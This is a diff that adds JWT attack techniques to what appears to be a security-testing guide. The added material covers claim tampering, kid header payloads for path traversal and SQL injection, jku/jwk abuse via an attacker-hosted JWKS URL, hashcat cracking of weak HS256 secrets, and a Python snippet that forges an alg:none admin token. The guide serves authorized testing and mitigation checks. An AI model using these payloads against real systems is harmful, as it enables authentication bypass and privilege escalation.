@@ -341,6 +341,26 @@ jwt_tool <TOKEN> -X s -pk public.pem
 curl -H "Authorization: Bearer <CONFUSED_TOKEN>" https://target/api/me
 ```
 
+**Claim tampering** (after signature bypass or weak key): elevate `role`/`is_admin`, swap `sub` to another user ID, then replay on a protected route.
+
+**kid abuse** — if verification resolves keys from `kid`:
+- Path traversal: `"kid":"../../../../dev/null"` with empty HMAC secret (sign HS256 with `""`)
+- File reference: `"kid":"/proc/sys/kernel/hostname"` or `"kid":"../../../../keys/prod.key"`
+- SQLi in lookup: `"kid":"' OR '1'='1"` when `kid` is interpolated into a query
+
+**jku / inline jwk** — host attacker JWKS at `https://YOUR-COLLABORATOR.oast.fun/jwks.json`, set `"jku"` to that URL, or embed an attacker RSA key in the `"jwk"` header field; re-sign and send if the server fetches/trusts header-supplied keys.
+
+**Weak HS256 secret** — offline crack captured token: `hashcat -m 16500 jwt.txt wordlist.txt`; re-sign with recovered secret and confirm server acceptance.
+
+```python
+# Minimal alg:none (base64url, no padding) — third segment empty or omitted
+import base64, json
+h = base64.urlsafe_b64encode(json.dumps({"alg":"none","typ":"JWT"}).encode()).rstrip(b"=").decode()
+p = base64.urlsafe_b64encode(json.dumps({"sub":"1","role":"admin"}).encode()).rstrip(b"=").decode()
+forged = f"{h}.{p}."
+# curl -H "Authorization: Bearer $forged" https://target/api/admin/users
+```
+
 Success = protected resource returns data for attacker-controlled claims. Rejection with `401`/`403` and no claim trust indicates effective mitigation.
 
 ## Common False Alarms
